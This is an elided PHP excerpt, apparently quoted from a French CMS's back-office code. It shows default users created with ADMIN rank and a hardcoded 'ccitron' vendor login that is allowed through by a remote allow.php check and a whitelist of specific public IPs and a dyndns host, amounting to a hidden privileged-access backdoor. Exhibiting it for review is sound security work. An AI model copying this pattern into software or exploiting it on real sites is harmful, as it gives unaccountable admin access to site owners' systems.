...
for ($i=0; $i<sizeof($aUserLogin); $i++)
{
	...
	// les utilisateurs par defaut sont crees avec :
	// - comme valides
	$user->valide = 1;
	// - le rang ADMIN
	$user->rank = DEF_ADMIN;
	// - pour le premier site par defaut
	$user->id_site = 1;
...
if(is_array($_SESSION['BO']) && isset($_SESSION['BO']['LOGGED'])) {
	...
	$erreur = 0;
	if(is_post('login')) {		
		// controles speciaux pour le compte ccitron // https://couleurcitron.com/allow.php
		if (trim($_POST['login'])=='ccitron'){		
			...
			elseif (preg_match('/10\.69\.[0-9]{1,3}\.[0-9]{1,3}/', $_SERVER['REMOTE_ADDR'])==1){
				...
				if ((!$contents) || ($contents=='incorrect usage') || ($contents=='forbidden')	||	preg_match('/<html>/msi', $contents)){ // pas de rsponse, on teste localement
					$aNames = array('suhali.dyndns.org'); 
					$aIPs = array('37.1.253.222', '37.1.253.217', '82.124.17.60', '82.228.89.184', '82.228.167.148', '81.249.110.2', '82.234.79.170', '88.124.114.41', '82.238.143.116', '92.245.150.148', '37.1.253.217', '91.165.234.173');
